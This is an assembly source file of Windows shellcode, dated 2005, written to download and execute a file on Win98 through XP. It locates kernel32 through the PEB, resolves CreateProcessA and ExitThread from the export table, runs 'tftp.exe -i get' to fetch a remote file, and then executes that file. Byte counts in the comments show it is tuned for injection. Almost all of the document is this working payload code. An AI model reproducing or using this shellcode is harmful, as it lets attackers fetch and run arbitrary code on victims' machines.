;
;  tftp  -  shellcode to accept download and execute a file
; 
;  Copyright (c) 2005 by Abs
;  All Rights Reserved
;
;  NOTE: Should work on Win98/ME/NT4/2K/XP, no matter which SP/language
;
;

  .386
  .model flat, stdcall
   option casemap:none

   include \masm32\include\windows.inc
;
;   kernel32 for testing only
;
    include \masm32\include\kernel32.inc
    includelib \masm32\lib\kernel32.lib
;

   assume fs:flat

  .code

   db "START->"
start:
; *** Dino Dai Zovi's PEB way to find kernel base ******************************
   xor   eax, eax
   mov   eax, fs:[eax+30h]      ; Extract the PEB

   test  eax, eax               ; Check for Windows 9x
   js    find_kernel32_9x       ; If signed short, jump to windows 9x lookup

find_kernel32_nt:
   mov   eax, [eax + 0ch]       ; Extract the PROCESS_MODULE_INFO pointer from the PEB
   mov   esi, [eax + 1ch]       ; Get the address of flink in the init module list
   lodsd                        ; Load the address of blink into eax
   mov   eax, [eax + 08h]       ; Grab the module base address from the list entry

   jmp   find_kernel32_finished ; Fall down to the bottom
find_kernel32_9x:
   mov   eax, [eax + 34h]       ; Undocumented offset (0x34)
   lea   eax, [eax + 7ch]       ; Load the address of eax+0x7c to keep us in signed byte range
   mov   eax, [eax + 3ch]       ; Undocumented offset (0xb8)
find_kernel32_finished:
; *** 31 bytes *****************************************************************
; = 31 bytes
; *** Find imports CreateProcessA & ExitThread *********************************
   mov   edx, eax               ; edx = ImageBase of kernel32

   add   eax, [eax + 3ch]       ; Get pointer to PE header

   mov   ecx, edx
   add   ecx, [eax + 78h]       ; ecx now holds pointer to export table

   mov   eax, edx
   add   eax, [ecx + 20h]       ; eax = ptr ptr names

   mov   ebx, edx
   add   ebx, [ecx + 1ch]       ; ebx = ptr ptr functions

   xor   edi, edi               ; will point to ExitThread
   xor   esi, esi               ; will point to CreateProcessA
find_createprocessa_and_exitthread_loop:
   mov   ecx, edx
   add   ecx, [eax]

   cmp   dword ptr [ecx + 0ah], "Asse" ; are we at CreateProcessA?
   jnz   not_createprocessa            ; no
   mov   esi, [ebx]                    ; yes, take address
not_createprocessa:

   cmp   dword ptr [ecx + 03h], "rhTt" ; are we at ExitThreadA?
   jne   not_exitthread                ; no
   mov   edi, [ebx]                    ; yes, take address
not_exitthread:

   add   eax, 04h
   add   ebx, 04h

   test  esi, esi
   jz    find_createprocessa_and_exitthread_loop
   test  edi, edi
   jz    find_createprocessa_and_exitthread_loop

   add   esi, edx
   add   edi, edx

; *** 68 bytes *****************************************************************
; = 99 bytes
; *** Put ExitThread to stack **************************************************
   xor   eax, eax
   push  eax               ; push 0 for ExitThread
   push  eax               ; return address for ExitThread
   push  edi               ; ExitThread itself :P
; *** 5 bytes ******************************************************************
; = 104 bytes
; *** Execute file & exit thread ***********************************************
   call push_commandline
   db "-i  get ", 0
push_commandline:
   call  push_executablepath
   db "tftp.exe", 0
push_executablepath:
   call  execute_file
   test  eax, eax
   jz    go_exitthread

push_commandline2_loop:
   call  PushCommandLine2
   db 0
PushCommandLine2:
   push  0
   call  execute_file
   test  eax, eax
   jz    push_commandline2_loop

go_exitthread:
   ret                     ; call ExitThread
; *** 94 bytes *****************************************************************
; = 198 bytes
; *** Executes a file **********************************************************
execute_file proc FileToExecute:DWORD, CmdLine:DWORD
   LOCAL prin:PROCESS_INFORMATION
   LOCAL stin:STARTUPINFO

   xor   eax, eax
   lea   edi, stin
   mov   ecx, eax
   mov   cl, 44h    ; sizeof STARTUPINFO
   mov   edx, ecx
   mov   ebx, edi
   rep   stosb

   assume ebx:ptr STARTUPINFO
   mov   dword ptr [ebx].cb, edx
   assume ebx:nothing

   lea   ecx, prin
   push  ecx               ; PROCESS_INFORMATION
   push  ebx               ; STARTUPINFO
   push  eax
   push  eax
   push  NORMAL_PRIORITY_CLASS or DETACHED_PROCESS
   push  TRUE
   push  eax
   push  eax
   push  CmdLine
   push  FileToExecute
   call  esi               ; CreateProcess

   ret
execute_file endp
; *** 48 bytes *****************************************************************
; = 246 bytes
   db "<-END"

;
;   for testing only
;
    call GetTickCount
;

end start
